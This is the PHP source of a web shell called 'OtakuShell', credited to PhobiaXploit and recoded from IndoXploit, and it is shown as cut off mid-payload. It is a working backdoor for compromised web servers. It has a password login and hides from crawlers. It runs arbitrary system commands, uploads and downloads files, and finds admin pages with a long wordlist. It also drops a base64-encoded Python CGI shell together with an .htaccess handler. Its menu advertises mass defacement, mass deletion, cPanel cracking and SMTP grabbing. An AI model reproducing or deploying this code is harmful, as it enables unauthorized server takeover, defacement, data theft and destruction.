<?php
//====================================================||
// Shell Ini hasil Recode Dari IndoXploit
// Terima Kasih Banyak Buat IndoXploit
// OtakuShell Release
// By : ./Tsuki 
//PhobiaXploit
//====================================================||

session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "f08537328e323639378d63d1cdc136a6"; // default: otaku
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>OtakuShell</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: url(https://images8.alphacoders.com/768/768986.jpg) no-repeat center center fixed;
	color: green;
	text-align: center;
}
header {
	color: red;
	margin: 10px auto;
}
input[type=password] {
	color: grey;
	background: #000000;
	border: 1px dotted black;
	margin-left: 20px;
	text-align: center;
}
input[name=text] {
	color: grey;
	background: #000000;
	border: 1px dotted white;
	margin-left: 20px;
  text-align: center;
}
</style>
</head>
<center>
<header>
<form method="post">

</form>
<font color="cyan" size="7">OtakuShell</font><font color="white" size="3"></font>
<br />
</header>
<br>
<font color="red" size="5" face="Audiowide">  [ </font>
<font color="white" size="5" face="Audiowide"> PhobiaXploit </font>
<font color="red" size="5" face="Audiowide"> ]</font>
<br>
<form method="post">
<input type="password" name="pass">
</form>
<br />
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
    echo "Insert Your Username & Password!";
}
?>
<html>
<head>
<title>OtakuShell</title>
<link rel="shortcut icon" href="https://z-p3-scontent-sin6-2.xx.fbcdn.net/v/t1.15752-9/38482614_214177999252616_7091981425154457600_n.png?_nc_cat=0&oh=74ffc383fff54804cbbe6dd6020099de&oe=5C10E579" type="image/gif"/>
<meta name='author' content='r00t666h0st'a charset="UTF-8">
<style type='text/css'> 
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: url(https://images2.alphacoders.com/791/791477.png) no-repeat center center fixed;
    color: white;
    font-family: 'Audiowide';
	font-size: 13px;
	width: 100%;
	text-align: center;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, Iceland, Audiowide, sans-serif;
	background: transparent;
	font-family: 'Audiowide';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid cyan;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: red;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: red; 
	border: 1px solid cyan; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Iceland';
	font-size: 13px;
}
textarea {
	border: 1px solid blue;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: yellow;
	font-family: 'Iceland';
	font-size: 13px;
}
</style>
</head>
<body background src ="url(https://images2.alphacoders.com/791/791477.png) no-repeat center center fixed">
 
<font color='cyan' size='7'>OtakuShell</font><font color='white' size='3'>v1</font><font color='white'><br> by<br> PhobiaXploit
<table><center>


<?php
#################
// PhobiaXploit
 //
#################
function w($dir,$perm) {
    if(!is_writable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=lime>".$perm."</font>";
    }
}
function r($dir,$perm) {
    if(!is_readable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=lime>".$perm."</font>";
    }
}
function exe($cmd) {
    if(function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif(function_exists('exec')) {
        @exec($cmd,$results);
        $buff = "";
        foreach($results as $result) {
            $buff .= $result;
        } return $buff;
    } elseif(function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif(function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);
        return $buff;
    }
}
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
    } else {
    // Unknown
    $info = 'u';
    }
        // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function hdd($s) {
    if($s >= 1073741824)
    return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
    return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
    return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
    return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
            curl_close($curl);
    return $content;
}
function bing($dork) {
    $npage = 1;
    $npages = 30000;
    $allLinks = array();
    $lll = array();
    while($npage <= $npages) {
        $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
        if($x) {
            preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
            foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
            $npage = $npage + 10;
            if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
        } else break;
    }
    $URLs = array();
    foreach($allLinks as $url){
        $exp = explode("/", $url);
        $URLs[] = $exp[2];
    }
    $array = array_filter($URLs);
    $array = array_unique($array);
    $sss = count(array_unique($array));
    foreach($array as $domain) {
        echo $domain."\n";
    }
}
function reverse($url) {
    $ch = curl_init("http://domains.yougetsignal.com/domains.php");
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
          curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_POST, 1);
    $resp = curl_exec($ch);
    $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
    $array = explode(",,", $resp);
    unset($array[0]);
    foreach($array as $lnk) {
        $lnk = "http://$lnk";
        $lnk = str_replace(",", "", $lnk);
        echo $lnk."\n";
        ob_flush();
        flush();
    }
        curl_close($ch);
}
if(get_magic_quotes_gpc()) {
    function idx_ss($array) {
        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
    $_COOKIE = idx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    chdir($dir);
} else {
    $dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=white>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
echo "<td>System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=yellow>".$ip."</font> | Your IP: <font color=yellow>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=yellow>$used</font> / <font color=yellow>$total</font> ( Free: <font color=yellow>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br></td><td></td><td></td><br>";
echo "<div align=left> Otaku Mode : <font color=lime>ON</font></div>";
echo "</table><hr color='cyan'><hr>";

echo "<li>[ <a href='?PhobiaXploit'>Home</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=info'>Info Server</a> ]</li>";
echo "<li>[ <a style='color: yellow;' href='?dir=$dir&do=tentang'>About Me</a> ]</li>";
echo "<li>[ <a style='color: red;' href='?logout=true'>Logout</a> ]</li>";
echo "<br>";
echo "<hr>";
foreach($scdir as $c_dir => $cdir) {
    echo "<a href='?dir=";
    for($i = 0; $i <= $c_dir; $i++) {
        echo $scdir[$i];
        if($i != $c_dir) {
        echo "/";
        }
    }
    echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo '<br>';
    echo "<center>";
    if($_POST['upload']) {
        if($_POST['tipe_upload'] == 'biasa') {
            if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
                $act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        } else {
            $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
            $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
            if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
                if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
                    $act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        }
    }
    echo "<font color=white>Upload File:
    <form method='post' enctype='multipart/form-data'>
    <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ]
    <input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
    <input type='file' name='ix_file'>
    <input type='submit' value='upload' name='upload'>
    </form>";
    echo $act;
    echo "</center></font>";
echo "<hr color=cyan>";
echo "<hr>";
echo "<center>";
echo "<ul>";
echo "<li>[ <a href='?dir=$dir&do=cmd'>Command Linux</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_delete'>Mass Delete</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=config'>Config</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=jumping'>Jumping</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=symlink'>Symlink</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cgi'>CGI Telnet</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=network'>Network</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=adminer'>Adminer</a> ]</li><br>";
echo "<li>[ <a href='?dir=$dir&do=fake_root'>Fake Root</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=string'>Script Endcode</a> ]</li><br>";
echo "<li>[ <a href='?dir=$dir&do=code'>Injection C0de</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=pou'>Bypass Cloud Flare</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=hash'>Hash Generate</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=hashid'>Hash ID</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=base-coc'>Tools SQL INJECTION</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=zip'>Zip Menu</a> ]</li>  ";
echo "<li>[ <a href='?dir=$dir&do=shelscan'>Shell Finder</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=portscan'>Port Scanner</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=adfin'>Admin Finder</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=python'>Python Bypass Exploit</a> ]</li>";
echo "</ul>";
echo "</center>";
echo "<hr color=cyan>";
echo "<hr>";
if($_GET['logout'] == true) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo "<script>window.location='?';</script>";
}


elseif($_GET['do'] == 'adfin')
{	
?>
<form action="?do=adfin" method="post">

<?php
set_time_limit(0);
error_reporting(0);
$list['front'] ="admin
adm
admincp
admcp
cp
modcp
moderatorcp
adminare
admins
cpanel
controlpanel";
$list['end'] = "admin1.php
admin1.html
admin2.php
admin2.html
yonetim.php
yonetim.html
yonetici.php
yonetici.html
ccms/
ccms/login.php
ccms/index.php
maintenance/
webmaster/
adm/
configuration/
configure/
websvn/
admin/
admin/account.php
admin/account.html
admin/index.php
admin/index.html
admin/login.php
admin/login.html
admin/home.php
admin/controlpanel.html
admin/controlpanel.php
admin.php
admin.html
admin/cp.php
admin/cp.html
cp.php
cp.html
administrator/
administrator/index.html
administrator/index.php
administrator/login.html
administrator/login.php
administrator/account.html
administrator/account.php
administrator.php
administrator.html
login.php
login.html
modelsearch/login.php
moderator.php
moderator.html
moderator/login.php
moderator/login.html
moderator/admin.php
moderator/admin.html
moderator/
account.php
account.html
controlpanel/
controlpanel.php
controlpanel.html
admincontrol.php
admincontrol.html
adminpanel.php
adminpanel.html
admin1.asp
admin2.asp
yonetim.asp
yonetici.asp
admin/account.asp
admin/index.asp
admin/login.asp
admin/home.asp
admin/controlpanel.asp
admin.asp
admin/cp.asp
cp.asp
administrator/index.asp
administrator/login.asp
administrator/account.asp
administrator.asp
login.asp
modelsearch/login.asp
moderator.asp
moderator/login.asp
moderator/admin.asp
account.asp
controlpanel.asp
admincontrol.asp
adminpanel.asp
fileadmin/
fileadmin.php
fileadmin.asp
fileadmin.html
administration/
administration.php
administration.html
sysadmin.php
sysadmin.html
phpmyadmin/
myadmin/
sysadmin.asp
sysadmin/
ur-admin.asp
ur-admin.php
ur-admin.html
ur-admin/
Server.php
Server.html
Server.asp
Server/
wp-admin/
administr8.php
administr8.html
administr8/
administr8.asp
webadmin/
webadmin.php
webadmin.asp
webadmin.html
administratie/
admins/
admins.php
admins.asp
admins.html
administrivia/
Database_Administration/
WebAdmin/
useradmin/
sysadmins/
admin1/
system-administration/
administrators/
pgadmin/
directadmin/
staradmin/
ServerAdministrator/
SysAdmin/
administer/
LiveUser_Admin/
sys-admin/
typo3/
panel/
cpanel/
cPanel/
cpanel_file/
platz_login/
rcLogin/
blogindex/
formslogin/
autologin/
support_login/
meta_login/
manuallogin/
simpleLogin/
loginflat/
utility_login/
showlogin/
memlogin/
members/
login-redirect/
sub-login/
wp-login/
login1/
dir-login/
login_db/
xlogin/
smblogin/
customer_login/
UserLogin/
login-us/
acct_login/
admin_area/
bigadmin/
project-admins/
phppgadmin/
pureadmin/
sql-admin/
radmind/
openvpnadmin/
wizmysqladmin/
vadmind/
ezsqliteadmin/
hpwebjetadmin/
newsadmin/
adminpro/
Lotus_Domino_Admin/
bbadmin/
vmailadmin/
Indy_admin/
ccp14admin/
irc-macadmin/
banneradmin/
sshadmin/
phpldapadmin/
macadmin/
administratoraccounts/
admin4_account/
admin4_colon/
radmind-1/
Super-Admin/
AdminTools/
cmsadmin/
SysAdmin2/
globes_admin/
cadmins/
phpSQLiteAdmin/
navSiteAdmin/
server_admin_small/
logo_sysadmin/
server/
database_administration/
power_user/
system_administration/
ss_vms_admin_sm/
adminarea/
bb-admin/
adminLogin/
panel-administracion/
instadmin/
memberadmin/
administratorlogin/
admin/admin.php
admin_area/admin.php
admin_area/login.php
siteadmin/login.php
siteadmin/index.php
siteadmin/login.html
admin/admin.html
admin_area/index.php
bb-admin/index.php
bb-admin/login.php
bb-admin/admin.php
admin_area/login.html
admin_area/index.html
admincp/index.asp
admincp/login.asp
admincp/index.html
webadmin/index.html
webadmin/admin.html
webadmin/login.html
admin/admin_login.html
admin_login.html
panel-administracion/login.html
nsw/admin/login.php
webadmin/login.php
admin/admin_login.php
admin_login.php
admin_area/admin.html
pages/admin/admin-login.php
admin/admin-login.php
admin-login.php
bb-admin/index.html
bb-admin/login.html
bb-admin/admin.html
admin/home.html
pages/admin/admin-login.html
admin/admin-login.html
admin-login.html
admin/adminLogin.html
adminLogin.html
home.html
rcjakar/admin/login.php
adminarea/index.html
adminarea/admin.html
webadmin/index.php
webadmin/admin.php
user.html
modelsearch/login.html
adminarea/login.html
panel-administracion/index.html
panel-administracion/admin.html
modelsearch/index.html
modelsearch/admin.html
admincontrol/login.html
adm/index.html
adm.html
user.php
panel-administracion/login.php
wp-login.php
adminLogin.php
admin/adminLogin.php
home.php
adminarea/index.php
adminarea/admin.php
adminarea/login.php
panel-administracion/index.php
panel-administracion/admin.php
modelsearch/index.php
modelsearch/admin.php
admincontrol/login.php
adm/admloginuser.php
admloginuser.php
admin2/login.php
admin2/index.php
adm/index.php
adm.php
affiliate.php
adm_auth.php
memberadmin.php
administratorlogin.php
admin/admin.asp
admin_area/admin.asp
admin_area/login.asp
admin_area/index.asp
bb-admin/index.asp
bb-admin/login.asp
bb-admin/admin.asp
pages/admin/admin-login.asp
admin/admin-login.asp
admin-login.asp
user.asp
webadmin/index.asp
webadmin/admin.asp
webadmin/login.asp
admin/admin_login.asp
admin_login.asp
panel-administracion/login.asp
adminLogin.asp
admin/adminLogin.asp
home.asp
adminarea/index.asp
adminarea/admin.asp
adminarea/login.asp
panel-administracion/index.asp
panel-administracion/admin.asp
modelsearch/index.asp
modelsearch/admin.asp
admincontrol/login.asp
adm/admloginuser.asp
admloginuser.asp
admin2/login.asp
admin2/index.asp
adm/index.asp
adm.asp
affiliate.asp
adm_auth.asp
memberadmin.asp
administratorlogin.asp
siteadmin/login.asp
siteadmin/index.asp
ADMIN/
paneldecontrol/
login/
cms/
admon/
ADMON/
administrador/
ADMIN/login.php
panelc/
ADMIN/login.html";
function template() {
echo '

<script type="text/javascript">
<!--
function insertcode($text, $place, $replace)
{
    var $this = $text;
    var logbox = document.getElementById($place);
    if($replace == 0)
        document.getElementById($place).innerHTML = logbox.innerHTML+$this;
    else
        document.getElementById($place).innerHTML = $this;
//document.getElementById("helpbox").innerHTML = $this;
}
-->
</script>
<br>
<br>
<h1 class="technique-two">
       


</h1>

<div class="wrapper">
<div class="red">
<div class="tube">
<center><table class="tabnet"><th colspan="2">Admin Finder</th><tr><td>
<form action="" method="post" name="xploit_form">

<tr>
<tr>
	<b><td>URL</td>
	<td><input class="inputz" type="text" name="xploit_url" value="'.$_POST['xploit_url'].'" style="width: 350px;" />
	</td>
</tr><tr>
	<td>404 string</td>
	<td><input class="inputz" type="text" name="xploit_404string" value="'.$_POST['xploit_404string'].'" style="width: 350px;" />
	</td></b>
</tr><br><td>
<span style="float: center;"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
</span></td></tr>
</form></td></tr>
<br /></table>
</div> <!-- /tube -->
</div> <!-- /red -->
<br />
<div class="green">
<div class="tube" id="rightcol">
Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
<b>Found ones:<br /></b>
</div> <!-- /tube -->
</div></center><!-- /green -->
<br clear="all" /><br />
<div class="blue">
<div class="tube" id="logbox">
<br />
<br />
Admin page Finder :<br /><br />
</div> <!-- /tube -->
</div> <!-- /blue -->
</div> <!-- /wrapper -->
<br clear="all"><br>';
}
function show($msg, $br=1, $stop=0, $place='logbox', $replace=0) {
    if($br == 1) $msg .= "<br />";
    echo "<script type=\"text/javascript\">insertcode('".$msg."', '".$place."', '".$replace."');</script>";
    if($stop == 1) exit;
    @flush();@ob_flush();
}
function check($x, $front=0) {
    global $_POST,$site,$false;
    if($front == 0) $t = $site.$x;
    else $t = 'http://'.$x.'.'.$site.'/';
    $headers = get_headers($t);
    if (!eregi('200', $headers[0])) return 0;
    $data = @file_get_contents($t);
    if($_POST['xploit_404string'] == "") if($data == $false) return 0;
    if($_POST['xploit_404string'] != "") if(strpos($data, $_POST['xploit_404string'])) return 0;
    return 1;
}
   
// --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
template();
if(!isset($_POST['xploit_url'])) die;
if($_POST['xploit_url'] == '') die;
$site = $_POST['xploit_url'];
if ($site[strlen($site)-1] != "/") $site .= "/";
if($_POST['xploit_404string'] == "") $false = @file_get_contents($site."d65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html");
$list['end'] = str_replace("\r", "", $list['end']);
$list['front'] = str_replace("\r", "", $list['front']);
$pathes = explode("\n", $list['end']);
$frontpathes = explode("\n", $list['front']);
show(count($pathes)+count($frontpathes), 1, 0, 'total', 1);
$verificate = 0;
foreach($pathes as $path) {
    show('Checking '.$site.$path.' : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="'.$site.$path.'">'.$site.$path.'</a>', 1, 0, 'rightcol', 0);
    }
}
preg_match("/\/\/(.*?)\//i", $site, $xx); $site = $xx[1];
if(substr($site, 0, 3) == "www") $site = substr($site, 4);
foreach($frontpathes as $frontpath) {
    show('Checking http://'.$frontpath.'.'.$site.'/ : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($frontpath, 1) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="http://'.$frontpath.'.'.$site.'/">'.$frontpath.'.'.$site.'</a>', 1, 0, 'rightcol', 0);
    }
   
}
}

elseif ($_GET['do'] == 'python') { 
echo "<center/><br/><b>
 +--==[ python  Bypass Exploit ]==--+ 
 </b><br><br>";
 
 
    mkdir('python', 0755);
    chdir('python');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
